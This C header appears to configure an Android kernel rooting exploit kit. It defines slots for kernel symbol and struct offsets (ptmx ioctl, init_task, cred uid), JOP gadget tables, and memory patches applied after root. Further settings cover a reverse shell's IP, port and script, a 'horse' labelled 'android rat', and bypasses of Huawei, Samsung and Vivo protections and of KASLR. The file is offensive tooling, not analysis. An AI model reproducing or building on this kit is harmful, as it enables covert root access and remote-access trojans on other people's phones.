#ifndef __PARAM_H
#define __PARAM_H

/* serial number */
#define n_sn "n"

/* kernel func and offset */

#define k_ptmx_fops "101"
#define k_ptmx_ioctl_offset "102"
#define k_ptmx_kfunc_offset "103"

// init_tast used to traverse tasks list
#define k_init_task "104"
// task security offset
#define k_task_security_offset "105"

// used for control kernel_sock_ioctl regs
#define k_before_kernel_sock_ioctl "106"
// set_fs(KERNEL_FS) used for patch thread_addr limit
#define k_kernel_sock_ioctl "107"
// used for restore kernel_sock_ioctl regs
#define k_after_kernel_sock_ioctl "108"

// struct cred{} uid offset
#define k_task_cred_uid_offset "109"


/* kernel func and offset end */



/* jop */

struct jop_gadget {
  unsigned long index;
  unsigned long addr;
};

struct jop_gadget j_jop1[0x10];
struct jop_gadget j_jop2[0x10];
struct jop_gadget j_jop3[0x10];
struct jop_gadget j_jop4[0x10];
struct jop_gadget j_jop5[0x10];

//
#define j_patch_kfunc_jop "200"
// this value need in 8890 adp
#define j_patch_ptmx_ioctl_jop "201"

/* jop end */

/* patch mem after root*/

struct patch_gadget {
  unsigned long addr;
  unsigned long value;
  unsigned char len;
};

struct patch_gadget p_patch[0x10];

/* patch mem end */

// #define adp_fix_ptmx_ioctl_x20_reg_jop

/* reverse shell and script */

#define r_rshell_status "900"  // 0 disable, 1 enable
#define r_rshell_ip "901"
#define r_rshell_port "902"
#define r_script_path "903"
#define r_horse_status "911"   // android rat
/* reverse shell and script end */


/* vendor protect bypass */

// huawei mount
#define k_ro_secure_debuggable "801"
#define k_ro_secure_debuggable_static "802"

// vendor execve && mount restrict after root
// samsung: 1, vivo: 2,
#define k_vendor_exec_restrict "811"

// kaslr
#define k_kaslr_2kfunc_offset "851"

/* vendor protect bypass end */

int parse_args(int argc, char* argv[]);

#endif